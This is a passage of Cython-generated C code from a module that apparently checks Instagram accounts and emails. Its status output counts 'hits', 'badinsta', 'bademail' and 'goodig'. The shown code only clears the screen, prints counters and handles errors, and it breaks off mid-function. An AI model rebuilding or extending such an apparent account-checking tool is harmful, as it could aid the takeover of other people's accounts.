      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_ID); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 203, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_7 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_7)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_7);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
        }
      }
      __pyx_t_4 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_7, __pyx_t_6) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_6);
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 203, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_8 = __Pyx_PyObject_IsTrue(__pyx_t_4); if (unlikely(__pyx_t_8 < 0)) __PYX_ERR(0, 203, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_9 = ((!__pyx_t_8) != 0);
      if (__pyx_t_9) {

        
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__15, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 204, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        
        __pyx_t_4 = __Pyx_PyObject_CallNoArg(__pyx_builtin_exit); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 205, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        
      }

      
      __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__16, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 207, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

      
    }
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L8_try_end;
    __pyx_L3_error:;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;

    
    __pyx_t_10 = __Pyx_PyErr_ExceptionMatches(((PyObject *)(&((PyTypeObject*)PyExc_Exception)[0])));
    if (__pyx_t_10) {
      __Pyx_AddTraceback("source.main", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_4, &__pyx_t_5, &__pyx_t_6) < 0) __PYX_ERR(0, 209, __pyx_L5_except_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_INCREF(__pyx_t_5);
      __pyx_v_e = __pyx_t_5;
      /*try:*/ {

        
        __pyx_t_7 = __Pyx_PyObject_FormatSimple(__pyx_v_e, __pyx_empty_unicode); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 210, __pyx_L15_error)
        __Pyx_GOTREF(__pyx_t_7);
        __pyx_t_11 = __Pyx_PyUnicode_Concat(__pyx_kp_u_Error, __pyx_t_7); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 210, __pyx_L15_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_11); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 210, __pyx_L15_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

        
        __pyx_t_7 = __Pyx_PyObject_CallNoArg(__pyx_builtin_exit); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 211, __pyx_L15_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      }

      
      /*finally:*/ {
        /*normal exit:*/{
          __Pyx_DECREF(__pyx_v_e);
          __pyx_v_e = NULL;
          goto __pyx_L16;
        }
        __pyx_L15_error:;
        /*exception exit:*/{
          __Pyx_PyThreadState_declare
          __Pyx_PyThreadState_assign
          __pyx_t_14 = 0; __pyx_t_15 = 0; __pyx_t_16 = 0; __pyx_t_17 = 0; __pyx_t_18 = 0; __pyx_t_19 = 0;
          __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
          __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
          if (PY_MAJOR_VERSION >= 3) __Pyx_ExceptionSwap(&__pyx_t_17, &__pyx_t_18, &__pyx_t_19);
          if ((PY_MAJOR_VERSION < 3) || unlikely(__Pyx_GetException(&__pyx_t_14, &__pyx_t_15, &__pyx_t_16) < 0)) __Pyx_ErrFetch(&__pyx_t_14, &__pyx_t_15, &__pyx_t_16);
          __Pyx_XGOTREF(__pyx_t_14);
          __Pyx_XGOTREF(__pyx_t_15);
          __Pyx_XGOTREF(__pyx_t_16);
          __Pyx_XGOTREF(__pyx_t_17);
          __Pyx_XGOTREF(__pyx_t_18);
          __Pyx_XGOTREF(__pyx_t_19);
          __pyx_t_10 = __pyx_lineno; __pyx_t_12 = __pyx_clineno; __pyx_t_13 = __pyx_filename;
          {
            __Pyx_DECREF(__pyx_v_e);
            __pyx_v_e = NULL;
          }
          if (PY_MAJOR_VERSION >= 3) {
            __Pyx_XGIVEREF(__pyx_t_17);
            __Pyx_XGIVEREF(__pyx_t_18);
            __Pyx_XGIVEREF(__pyx_t_19);
            __Pyx_ExceptionReset(__pyx_t_17, __pyx_t_18, __pyx_t_19);
          }
          __Pyx_XGIVEREF(__pyx_t_14);
          __Pyx_XGIVEREF(__pyx_t_15);
          __Pyx_XGIVEREF(__pyx_t_16);
          __Pyx_ErrRestore(__pyx_t_14, __pyx_t_15, __pyx_t_16);
          __pyx_t_14 = 0; __pyx_t_15 = 0; __pyx_t_16 = 0; __pyx_t_17 = 0; __pyx_t_18 = 0; __pyx_t_19 = 0;
          __pyx_lineno = __pyx_t_10; __pyx_clineno = __pyx_t_12; __pyx_filename = __pyx_t_13;
          goto __pyx_L5_except_error;
        }
        __pyx_L16:;
      }
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      goto __pyx_L4_exception_handled;
    }
    goto __pyx_L5_except_error;
    __pyx_L5_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L4_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_1);
    __Pyx_XGIVEREF(__pyx_t_2);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
    __pyx_L8_try_end:;
  }

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_11);
  __Pyx_AddTraceback("source.main", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_e);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_11pppp(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_6source_11pppp = {"pppp", (PyCFunction)__pyx_pw_6source_11pppp, METH_NOARGS, 0};
static PyObject *__pyx_pw_6source_11pppp(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("pppp (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_10pppp(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_10pppp(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_v_output = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  Py_ssize_t __pyx_t_4;
  Py_UCS4 __pyx_t_5;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("pppp", 0);

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 230, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_system); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 230, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_2, __pyx_n_u_clear) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_n_u_clear);
  __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 230, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyTuple_New(11); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 231, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_4 = 0;
  __pyx_t_5 = 127;
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_cyan); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 231, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 231, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_red); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 231, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 231, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_t_3);
  __pyx_t_3 = 0;
  __Pyx_INCREF(__pyx_kp_u__17);
  __pyx_t_5 = (1114111 > __pyx_t_5) ? 1114111 : __pyx_t_5;
  __pyx_t_4 += 8;
  __Pyx_GIVEREF(__pyx_kp_u__17);
  PyTuple_SET_ITEM(__pyx_t_1, 2, __pyx_kp_u__17);
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_hits); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 231, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 231, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_1, 3, __pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_INCREF(__pyx_kp_u__18);
  __pyx_t_5 = (1114111 > __pyx_t_5) ? 1114111 : __pyx_t_5;
  __pyx_t_4 += 13;
  __Pyx_GIVEREF(__pyx_kp_u__18);
  PyTuple_SET_ITEM(__pyx_t_1, 4, __pyx_kp_u__18);

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_badinsta); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 232, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 232, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_1, 5, __pyx_t_3);
  __pyx_t_3 = 0;
  __Pyx_INCREF(__pyx_kp_u__19);
  __pyx_t_5 = (1114111 > __pyx_t_5) ? 1114111 : __pyx_t_5;
  __pyx_t_4 += 8;
  __Pyx_GIVEREF(__pyx_kp_u__19);
  PyTuple_SET_ITEM(__pyx_t_1, 6, __pyx_kp_u__19);

  
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_bademail); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 233, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_3, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 233, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_1, 7, __pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_INCREF(__pyx_kp_u__20);
  __pyx_t_5 = (1114111 > __pyx_t_5) ? 1114111 : __pyx_t_5;
  __pyx_t_4 += 9;
  __Pyx_GIVEREF(__pyx_kp_u__20);
  PyTuple_SET_ITEM(__pyx_t_1, 8, __pyx_kp_u__20);

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_goodig); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 234, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 234, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_3) : __pyx_t_5;
  __pyx_t_4 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_3);
  __Pyx_GIVEREF(__pyx_t_3);
  PyTuple_SET_ITEM(__pyx_t_1, 9, __pyx_t_3);
  __pyx_t_3 = 0;
  __Pyx_INCREF(__pyx_kp_u__5);
  __pyx_t_4 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__5);
  PyTuple_SET_ITEM(__pyx_t_1, 10, __pyx_kp_u__5);

  
  __pyx_t_3 = __Pyx_PyUnicode_Join(__pyx_t_1, 11, __pyx_t_4, __pyx_t_5); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 231, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_v_output = ((PyObject*)__pyx_t_3);
  __pyx_t_3 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_sys); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 235, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_stdout); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 235, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_write); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 235, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_1);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_1, function);
    }
  }
  __pyx_t_3 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_2, __pyx_v_output) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_v_output);
  __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 235, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_sys); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 236, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_stdout); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 236, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_flush); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 236, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_1);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_1, function);
    }
  }
  __pyx_t_3 = (__pyx_t_2) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_2) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 236, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_AddTraceback("source.pppp", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_output);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_13tll(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_6source_13tll = {"tll", (PyCFunction)__pyx_pw_6source_13tll, METH_NOARGS, 0};
static PyObject *__pyx_pw_6source_13tll(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("tll (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_12tll(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}
static PyObject *__pyx_gb_6source_3tll_2generator(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value); /* proto */



static PyObject *__pyx_pf_6source_3tll_genexpr(CYTHON_UNUSED PyObject *__pyx_self) {
  struct __pyx_obj_6source___pyx_scope_struct__genexpr *__pyx_cur_scope;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("genexpr", 0);
  __pyx_cur_scope = (struct __pyx_obj_6source___pyx_scope_struct__genexpr *)__pyx_tp_new_6source___pyx_scope_struct__genexpr(__pyx_ptype_6source___pyx_scope_struct__genexpr, __pyx_empty_tuple, NULL);
  if (unlikely(!__pyx_cur_scope)) {
    __pyx_cur_scope = ((struct __pyx_obj_6source___pyx_scope_struct__genexpr *)Py_None);
    __Pyx_INCREF(Py_None);
    __PYX_ERR(0, 281, __pyx_L1_error)
  } else {
    __Pyx_GOTREF(__pyx_cur_scope);
  }
  {
    __pyx_CoroutineObject *gen = __Pyx_Generator_New((__pyx_coroutine_body_t) __pyx_gb_6source_3tll_2generator, NULL, (PyObject *) __pyx_cur_scope, __pyx_n_s_genexpr, __pyx_n_s_tll_locals_genexpr, __pyx_n_s_source); if (unlikely(!gen)) __PYX_ERR(0, 281, __pyx_L1_error)
    __Pyx_DECREF(__pyx_cur_scope);
    __Pyx_RefNannyFinishContext();
    return (PyObject *) gen;
  }

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_AddTraceback("source.tll.genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __Pyx_DECREF(((PyObject *)__pyx_cur_scope));
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_gb_6source_3tll_2generator(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value) /* generator body */
{
  struct __pyx_obj_6source___pyx_scope_struct__genexpr *__pyx_cur_scope = ((struct __pyx_obj_6source___pyx_scope_struct__genexpr *)__pyx_generator->closure);
  PyObject *__pyx_r = NULL;
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  Py_ssize_t __pyx_t_3;
  PyObject *(*__pyx_t_4)(PyObject *);
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("genexpr", 0);
  switch (__pyx_generator->resume_label) {
    case 0: goto __pyx_L3_first_run;
    default: /* CPython raises the right error here */
    __Pyx_RefNannyFinishContext();
    return NULL;
  }
  __pyx_L3_first_run:;
  if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 281, __pyx_L1_error)
  __pyx_r = PyList_New(0); if (unlikely(!__pyx_r)) __PYX_ERR(0, 281, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_r);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_rr); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 281, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__21, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 281, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_range, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 281, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (likely(PyList_CheckExact(__pyx_t_1)) || PyTuple_CheckExact(__pyx_t_1)) {
    __pyx_t_2 = __pyx_t_1; __Pyx_INCREF(__pyx_t_2); __pyx_t_3 = 0;
    __pyx_t_4 = NULL;
  } else {
    __pyx_t_3 = -1; __pyx_t_2 = PyObject_GetIter(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 281, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_4 = Py_TYPE(__pyx_t_2)->tp_iternext; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 281, __pyx_L1_error)
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  for (;;) {
    if (likely(!__pyx_t_4)) {
      if (likely(PyList_CheckExact(__pyx_t_2))) {
        if (__pyx_t_3 >= PyList_GET_SIZE(__pyx_t_2)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_1 = PyList_GET_ITEM(__pyx_t_2, __pyx_t_3); __Pyx_INCREF(__pyx_t_1); __pyx_t_3++; if (unlikely(0 < 0)) __PYX_ERR(0, 281, __pyx_L1_error)
        #else
        __pyx_t_1 = PySequence_ITEM(__pyx_t_2, __pyx_t_3); __pyx_t_3++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 281, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
        #endif
      } else {
        if (__pyx_t_3 >= PyTuple_GET_SIZE(__pyx_t_2)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
